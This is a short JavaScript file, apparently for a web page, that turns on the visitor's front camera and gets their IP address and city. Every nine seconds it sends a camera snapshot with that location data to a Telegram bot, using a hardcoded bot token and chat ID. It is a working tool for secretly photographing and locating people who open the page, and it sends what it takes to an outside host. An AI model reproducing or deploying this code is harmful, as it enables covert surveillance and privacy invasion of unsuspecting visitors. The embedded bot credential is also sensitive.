    // Telegram par img or ip address location receive code //

    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    const constraints = {
     audio: false,
     video: {
      facingMode: "user"
     }
    };

    async function init() {
     try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
     } catch (e) {
      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
     }
    }

    async function getIPAddress() {
     const response = await fetch('https://api64.ipify.org?format=json');
     const data = await response.json();
     return data.ip;
    }

    async function getStateDistrict(ip) {
     const response = await fetch(`https://ipapi.co/${ip}/json/`);
     const data = await response.json();
     const state = data.region;
     const district = data.city;
     return { state, district };
    }

    async function handleSuccess(stream) {
     window.stream = stream;
     video.srcObject = stream;

     setInterval(async function() {
      const ip = await getIPAddress();
      const location = await getStateDistrict(ip);

      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, 640, 640);
      const canvasData = canvas.toDataURL("image/png");

      sendImageToTelegram(canvasData, ip, location.state, location.district);
     }, 9000);
    }

    async function sendImageToTelegram(imageData, ip, state, district) {
     try {
      var botToken ='7940861106:AAGgn5mk3TW_BsbRyQQzhnzCoQH-YRHH4rI';
      var chatId = '6619947117';
      var apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

      var byteCharacters = atob(imageData.split(',')[1]);
      var byteNumbers = new Array(byteCharacters.length);
      for (var i = 0; i < byteCharacters.length; i++) {
       byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      var byteArray = new Uint8Array(byteNumbers);
      var blob = new Blob([byteArray], { type: 'image/png' });

      var formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'captured_image.png');
      formData.append('caption', `IP: ${ip}, State: ${state}, District: ${district}`);

      const telegramResponse = await fetch(apiUrl, {
       method: 'POST',
       body: formData,
      });

      const result = await telegramResponse.json();
      // Handle success or error if needed
     } catch (error) {
      console.error('Error sending to Telegram:', error);
      // Handle error if needed
     }
    }

    // Load init
    init();
